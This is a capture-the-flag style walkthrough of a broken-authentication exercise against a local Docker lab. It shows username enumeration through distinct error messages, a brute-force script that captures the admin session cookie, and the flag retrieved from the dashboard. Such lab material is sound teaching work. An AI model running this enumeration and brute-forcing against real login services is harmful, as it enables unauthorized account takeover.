# Walkthrough: Broken Authentication

## Setup

```bash
docker compose up --build -d
```

## Step 1: Probe Error Messages

```bash
curl -s -X POST http://localhost:8085/login \
  -H "Content-Type: application/json" \
  -d '{"username":"notauser","password":"x"}'
```
Output: `{"error": "user not found"}`

```bash
curl -s -X POST http://localhost:8085/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"x"}'
```
Output: `{"error": "incorrect password"}`

Different messages confirm `admin` exists.

## Step 2: Brute-Force the Password

```python
import json, urllib.request

for pw in ["password", "123456", "admin", "admin123"]:
    req = urllib.request.Request("http://localhost:8085/login",
        data=json.dumps({"username": "admin", "password": pw}).encode(),
        headers={"Content-Type": "application/json"}, method="POST")
    try:
        with urllib.request.urlopen(req) as r:
            cookie = r.headers.get("Set-Cookie", "")
            if cookie:
                print(f"Found: admin:{pw}  cookie: {cookie}")
                break
    except: pass
```

Output: `Found: admin:admin123  cookie: session=...`

## Step 3: Access the Dashboard

```bash
SESSION=<token from above>
curl -s http://localhost:8085/dashboard -H "Cookie: session=$SESSION"
```

Output:
```json
{
  "message": "Welcome, admin.",
  "flag": "POC{...}"
}
```

## Automated Exploit

```bash
python3 exploit/exploit.py http://localhost:8085
```

Output:
```
[*] Phase 1: Username enumeration
  admin: EXISTS (wrong password)
  user: EXISTS (wrong password)

[*] Phase 2: Password brute-force
  Trying admin...
  [+] admin:admin123 -> logged in!
  [+] Flag: POC{...}
```
